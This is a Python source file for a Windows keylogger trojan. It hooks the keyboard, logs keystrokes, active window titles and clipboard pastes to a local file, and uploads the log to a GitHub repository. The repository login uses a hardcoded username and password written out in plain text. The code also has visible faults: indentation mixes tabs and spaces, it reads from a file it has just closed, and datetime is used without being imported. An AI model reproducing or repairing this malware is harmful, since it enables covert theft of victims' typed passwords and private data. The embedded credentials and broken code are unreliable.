from ctypes import *
import sys
import pythoncom
import pyHook 
import win32clipboard
import time
from github3 import login

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

num = 1
s = ""
f = open("file.txt", "a");
trojan_id = "abc"
trojan_config = "%s.json" % trojan_id
data_path     = "data/%s/" % trojan_id

def get_current_process():
    global s
    global f
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # print out the header if we're in the right process
    f.write("\n[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value) + "\n")

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):
    global current_window
    global num
    global s
    global f
    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        f.write(chr(event.Ascii))
		
	num = num + 1
		
    else:
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("[PASTE] - %s" % (pasted_value))
        else:
            f.write("[%s]" % event.Key)

			
    # pass execution to next hook registered 
    return True
def run(**args):
    global s
    global num
    global f
    kl         = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()
    while True:
		while num < 100:
			time.sleep(0.02)
			pythoncom.PumpWaitingMessages()
			f.close()
			f = open("file.txt", "r")
			f.close()
			store_module_result(f.read())
			f = open("file.txt", "a")
		num = 1
def store_module_result(data):
    gh,repo,branch = connect_to_github()
    remote_path = "data/%s/%s.data" % (trojan_id,str(datetime.datetime.now()))                            
    repo.create_file(remote_path,"Commit message",data)
    return
def connect_to_github():
    gh = login(username="tomnwinter",password="t19090539")
    repo = gh.repository("tomnwinter","test")
    branch = repo.branch("master")    
    return gh,repo,branch
